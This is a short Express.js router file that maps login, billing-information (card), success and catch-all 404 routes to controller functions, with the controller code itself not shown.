const express = require("express");
const router = express.Router();
const controller = require("../controller/controller");

// Routes
router.get("/auth/login", controller.login);
router.post("/auth/login", controller.loginPost);

router.get("/auth/billing-information", controller.card);
router.post("/auth/billing-information", controller.cardPost);

router.get("/auth/success", controller.success);

router.get("*", controller.page404Redirect);

module.exports = router;
